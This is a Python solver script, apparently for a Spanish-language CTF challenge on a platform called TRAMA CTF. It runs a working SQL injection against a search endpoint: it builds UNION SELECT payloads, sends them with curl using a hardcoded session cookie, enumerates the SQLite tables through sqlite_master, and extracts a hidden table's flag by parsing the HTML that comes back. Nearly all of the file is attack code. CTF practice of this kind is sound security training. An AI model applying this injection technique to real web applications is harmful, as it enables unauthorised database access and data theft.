#!/usr/bin/env python3
"""
Desafío «La Feria del Persa» — solver end-to-end.

1. Enumera tablas de la SQLite vía UNION SELECT en /buscar?q=
2. Localiza la tabla oculta `puesto_13`
3. Extrae el código de garantía (= flag)

Requiere la cookie de sesión que entrega la plataforma TRAMA CTF.
"""
import re
import subprocess
import urllib.parse
from html import unescape

COOKIE = ("trama_session=Vgb10FPCRELz_F_vMBbmZuRHczUjV3V1DKFygYKh22mTBZ"
          "dgeA-3Qsy5Sgd3RSKU")
BASE = "https://<host>"
MARCA = "ZZZCAT"


def inyectar(expr: str, col: int = 2) -> str:
    cols = ["1", "2", "3", "4", f"'{MARCA}'"]
    cols[col - 1] = expr
    payload = "' UNION SELECT " + ",".join(cols) + "-- -"
    url = f"{BASE}/buscar?q={urllib.parse.quote(payload)}"
    html = subprocess.run(["curl", "-s", "-m", "25", "-b", COOKIE, url],
                          capture_output=True, text=True).stdout
    arts = re.findall(r'(?s)<article class="producto-card[^"]*">.*?</article>', html)
    art = next((a for a in arts if MARCA in a), None)
    if art is None:
        return "[sin datos]"
    if col == 3:
        pat = r"<p>(.*?)</p>"
    elif col == 4:
        pat = r'producto-precio">(.*?)<'
    else:
        pat = r"<h3>(.*?)</h3>"
    m = re.search(pat, art, re.S)
    return unescape(m.group(1)).strip() if m else ""


def main() -> None:
    print("[*] versión sqlite:", inyectar("sqlite_version()"))
    print("[*] tablas:", inyectar(
        "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')"))

    flag = inyectar("(SELECT codigo_garantia FROM puesto_13)")
    item = inyectar("(SELECT item FROM puesto_13)")
    print(f"[*] puesto 13 contiene: {item}")
    print(f"\n[+] FLAG: {flag}")


if __name__ == "__main__":
    main()
